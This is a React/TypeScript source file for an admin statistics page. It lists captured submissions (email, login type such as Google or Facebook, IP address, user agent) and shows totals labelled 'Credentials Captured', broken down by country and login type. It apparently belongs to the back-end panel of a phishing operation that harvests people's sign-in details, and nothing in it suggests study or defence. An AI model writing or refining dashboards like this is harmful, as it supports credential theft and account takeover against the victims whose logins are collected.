import { createFileRoute } from "@tanstack/react-router";
import { Search } from "lucide-react";
import { useEffect, useMemo, useState } from "react";
import { Bar, BarChart, CartesianGrid, Line, LineChart, XAxis, YAxis } from "recharts";

import { AdminCard, AdminInput, AdminSelect, PageHeader } from "@/components/settings/ui";
import { ChartContainer, ChartTooltip, ChartTooltipContent, type ChartConfig } from "@/components/ui/chart";
import { adminMeta } from "@/lib/admin/meta";
import { fetchStats, type StatsData, type LogEntry, filterLogs, visitorsPerDay, actionsPerHour, rangeBounds, type RangeFilter } from "@/lib/admin/sample-logs";
import { getAdminToken } from "@/lib/admin/store";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/settings/_panel/stats")({
  head: () => adminMeta("Statistics", "Website visitor and credential statistics."),
  component: StatsPage,
});

const lineConfig = { visitors: { label: "Visitors", color: "var(--adm-primary)" } } satisfies ChartConfig;
const barConfig = { actions: { label: "Actions", color: "var(--adm-success)" } } satisfies ChartConfig;

const actionTone: Record<string, string> = {
  View: "bg-adm-primary/12 text-adm-primary",
  Download: "bg-adm-success/15 text-adm-success",
  Login: "bg-adm-warning/25 text-adm-text",
  main: "bg-adm-primary/12 text-adm-primary",
  google: "bg-adm-success/15 text-adm-success",
  facebook: "bg-adm-warning/25 text-adm-text",
};

function formatTime(iso: string) {
  return `${iso.slice(0, 10)} ${iso.slice(11, 16)}`;
}

function StatsPage() {
  const [kind, setKind] = useState<RangeFilter["kind"]>("7d");
  const [from, setFrom] = useState("");
  const [to, setTo] = useState("");
  const [query, setQuery] = useState("");
  const [stats, setStats] = useState<StatsData | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const token = getAdminToken();

  useEffect(() => {
    if (token) {
      const fetchData = async () => {
        try {
          const statsData = await fetchStats(token);
          setStats(statsData);
          
          // Convert to LogEntry format
          const logEntries: LogEntry[] = statsData?.recent_submissions?.map((sub, index) => ({
            id: index + 1,
            email: sub.email,
            timestamp: sub.created_at || new Date().toISOString(),
            action: sub.login_type === 'main' ? 'Login' : 'Login',
            ip: sub.ip_address || 'Unknown',
            userAgent: sub.user_agent || 'Unknown'
          })) || [];
          setLogs(logEntries);
        } catch (error) {
          console.error('Failed to fetch stats:', error);
        } finally {
          setLoading(false);
        }
      };
      fetchData();
    }
  }, [token]);

  const range: RangeFilter = kind === "custom" ? { kind, from, to } : { kind };
  const rows = useMemo(() => filterLogs(logs, range, query), [logs, kind, from, to, query]);
  const perDay = useMemo(() => visitorsPerDay(rows, range), [rows, range]);
  const perHour = useMemo(() => actionsPerHour(rows), [rows]);

  const totalVisitors = stats?.total_visitors || 0;
  const totalCredentials = stats?.total_credentials || 0;
  const byType = stats?.by_type || {};
  const byCountry = stats?.by_country || {};

  return (
    <div className="mx-auto max-w-[1200px]">
      <PageHeader title="Statistics" subtitle="Website activity and credential statistics." />

      <AdminCard className="flex flex-col gap-4 md:flex-row md:items-end">
        <div className="flex flex-col gap-[6px] md:w-[200px]">
          <label htmlFor="range" className="text-[14px] font-medium text-adm-text">
            Date range
          </label>
          <AdminSelect id="range" value={kind} onChange={(e) => setKind(e.target.value as RangeFilter["kind"])}>
            <option value="7d">Last 7 days</option>
            <option value="30d">Last 30 days</option>
            <option value="custom">Custom</option>
          </AdminSelect>
        </div>
        {kind === "custom" && (
          <div className="grid grid-cols-2 gap-3 md:w-[320px]">
            <div className="flex flex-col gap-[6px]">
              <label htmlFor="from" className="text-[14px] font-medium text-adm-text">
                From
              </label>
              <AdminInput id="from" type="date" value={from} onChange={(e) => setFrom(e.target.value)} />
            </div>
            <div className="flex flex-col gap-[6px]">
              <label htmlFor="to" className="text-[14px] font-medium text-adm-text">
                To
              </label>
              <AdminInput id="to" type="date" value={to} onChange={(e) => setTo(e.target.value)} />
            </div>
          </div>
        )}
        <div className="flex flex-1 flex-col gap-[6px]">
          <label htmlFor="search" className="text-[14px] font-medium text-adm-text">
            Search
          </label>
          <AdminInput
            id="search"
            type="search"
            placeholder="Search by email or IP..."
            value={query}
            onChange={(e) => setQuery(e.target.value)}
          />
        </div>
      </AdminCard>

      <div className="mt-4 grid gap-4 md:grid-cols-2">
        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">Visitors Over Time</h2>
          {loading ? (
            <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
          ) : perDay.length > 0 ? (
            <ChartContainer
              config={lineConfig}
              className="mt-4 h-[200px] w-full"
            >
              <LineChart data={perDay}>
                <CartesianGrid strokeDasharray="3 3" strokeOpacity={0.3} />
                <XAxis dataKey="day" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
                <YAxis tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
                <ChartTooltip cursor={false} content={<ChartTooltipContent />} />
                <Line type="monotone" dataKey="visitors" stroke="var(--adm-primary)" strokeWidth={2} dot={false} />
              </LineChart>
            </ChartContainer>
          ) : (
            <p className="mt-4 text-center text-adm-text-soft">No data available</p>
          )}
        </AdminCard>

        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">Actions by Hour</h2>
          {loading ? (
            <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
          ) : perHour.length > 0 ? (
            <ChartContainer
              config={barConfig}
              className="mt-4 h-[200px] w-full"
            >
              <BarChart data={perHour}>
                <CartesianGrid strokeDasharray="3 3" strokeOpacity={0.3} />
                <XAxis dataKey="hour" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
                <YAxis tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
                <ChartTooltip cursor={false} content={<ChartTooltipContent />} />
                <Bar dataKey="actions" fill="var(--adm-success)" radius={[4, 4, 0, 0]} />
              </BarChart>
            </ChartContainer>
          ) : (
            <p className="mt-4 text-center text-adm-text-soft">No data available</p>
          )}
        </AdminCard>
      </div>

      <div className="mt-4 grid gap-4 md:grid-cols-2">
        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">By Login Type</h2>
          <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3">
            {Object.entries(byType).map(([type, count]) => (
              <div key={type} className="rounded-[6px] bg-adm-bg p-3 text-center">
                <div className="text-[20px] font-bold text-adm-text">{count}</div>
                <div className="text-[12px] text-adm-text-soft capitalized">{type}</div>
              </div>
            ))}
            {Object.keys(byType).length === 0 && (
              <div className="col-span-full text-center text-adm-text-soft">No data available</div>
            )}
          </div>
        </AdminCard>

        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">By Country</h2>
          <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3">
            {Object.entries(byCountry).map(([country, count]) => (
              <div key={country} className="rounded-[6px] bg-adm-bg p-3 text-center">
                <div className="text-[20px] font-bold text-adm-text">{count}</div>
                <div className="text-[12px] text-adm-text-soft truncate">{country}</div>
              </div>
            ))}
            {Object.keys(byCountry).length === 0 && (
              <div className="col-span-full text-center text-adm-text-soft">No data available</div>
            )}
          </div>
        </AdminCard>
      </div>

      <AdminCard className="mt-4">
        <h2 className="text-[20px] font-semibold text-adm-text">Recent Activity</h2>
        <p className="mt-1 text-[14px] text-adm-text-soft">
          Total: {rows.length} entries
        </p>
        
        {loading ? (
          <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
        ) : rows.length > 0 ? (
          <div className="mt-4 overflow-x-auto">
            <table className="w-full text-left text-[13px]">
              <thead className="text-adm-text-soft">
                <tr className="border-b border-adm-border">
                  <th className="pb-2 pr-4 font-medium">Email</th>
                  <th className="pb-2 pr-4 font-medium">Action</th>
                  <th className="pb-2 pr-4 font-medium">IP</th>
                  <th className="pb-2 font-medium">Time</th>
                </tr>
              </thead>
              <tbody>
                {rows.slice(0, 20).map((row) => (
                  <tr key={row.id} className="border-b border-adm-border/50">
                    <td className="py-2 pr-4">
                      <span className="font-medium">{row.email}</span>
                    </td>
                    <td className="py-2 pr-4">
                      <span className={cn("rounded-[4px] px-2 py-1 text-[11px] font-medium", actionTone[row.action] || "bg-adm-bg text-adm-text")}>
                        {row.action}
                      </span>
                    </td>
                    <td className="py-2 pr-4 text-adm-text-soft">{row.ip}</td>
                    <td className="py-2 text-adm-text-soft">{formatTime(row.timestamp)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <p className="mt-4 text-center text-adm-text-soft">No activity found</p>
        )}
        
        {rows.length > 20 && (
          <p className="mt-4 text-center text-[12px] text-adm-text-soft">
            Showing 20 of {rows.length} entries
          </p>
        )}
      </AdminCard>

      <AdminCard className="mt-4">
        <h2 className="text-[20px] font-semibold text-adm-text">Summary</h2>
        <div className="mt-4 grid grid-cols-2 gap-4 sm:grid-cols-4">
          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
            <div className="text-[24px] font-bold text-adm-primary">{totalVisitors}</div>
            <div className="text-[12px] text-adm-text-soft">Total Visitors</div>
          </div>
          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
            <div className="text-[24px] font-bold text-adm-success">{totalCredentials}</div>
            <div className="text-[12px] text-adm-text-soft">Credentials Captured</div>
          </div>
          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
            <div className="text-[24px] font-bold text-adm-warning">{Object.keys(byType).length}</div>
            <div className="text-[12px] text-adm-text-soft">Login Types</div>
          </div>
          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
            <div className="text-[24px] font-bold text-adm-info">{Object.keys(byCountry).length}</div>
            <div className="text-[12px] text-adm-text-soft">Countries</div>
          </div>
        </div>
      </AdminCard>
    </div>
  );
}
